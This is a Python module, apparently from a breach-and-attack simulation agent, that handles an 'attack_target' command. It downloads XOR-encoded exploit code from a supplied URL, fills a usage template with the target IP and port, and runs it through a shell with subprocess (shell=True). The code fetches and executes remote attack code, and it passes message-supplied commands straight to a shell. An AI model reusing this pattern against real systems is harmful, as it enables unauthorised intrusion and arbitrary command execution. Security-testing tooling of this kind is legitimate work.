import sys
from pathlib import Path
path = Path(__file__).parent.resolve()
parent = path.parents[0]
[sys.path.append(x) for x in map(str, [path, parent]) if x not in sys.path]

from log_config import get_custom_logger
logger = get_custom_logger(__name__)

from processor import Processor
import subprocess

"""
{
    "type": "attack_target",
    "src_ip" : "x.x.x.x",
    "dst_ip" : "y.y.y.y",
    "dst_port" : 445
    "download": f"http://localhost:9000/exploit/{id}",
    "file_size": 1000,
    "usage": "python <FILE> <IP>",
},
"""
class TargetAttacker(Processor):
    signature = b"BAScope"
    FIELDS = ["dst_ip", "dst_port", "download", "file_size", "usage"]

    def __init__(self, cmd):
        super().__init__(cmd)
        self.check_cmd(self.FIELDS)
        self.path = str(parent) + "/tmp/ex.py"
        logger.info(f"[target] cmd: {cmd}")
        logger.debug(f"[target] file: {self.path}")

        return


    def run_cmd(self, debug = False):
        self.debug = debug
        target_ip = self.cmd["dst_ip"]
        self.link = self.cmd['download']  # 공격 코드 다운로드 링크
        target_port = self.cmd['dst_port']

        if self.debug:
            pass
        else:
            self.xor_download(self.link, self.path)

        replacements = [
            ("<FILE>", self.path),
            ("<IP>", target_ip),
            ("<PORT>", str(target_port))
        ]
        usage = self.cmd_after_replacement(self.cmd['usage'], replacements)
        logger.info(f"[target] Usage: {usage}")

        subprocess.call(usage, shell=True)

        return


    def report(self):
        # attack target 모드에서는 보고할 것이 없음.
        return


if __name__ == '__main__':
    msg = {
    "type": "attack_target",
    "dst_ip" : "127.0.0.1",
    "dst_port" : 445,
    "download": f"http://localhost:9000/exploit/{id}",
    "file_size": 1000,
    "usage": "python <FILE> <IP>",
    "ticket": 4,
    }

    a = TargetAttacker(msg)
    a.run_cmd(debug = True)
    a.report()

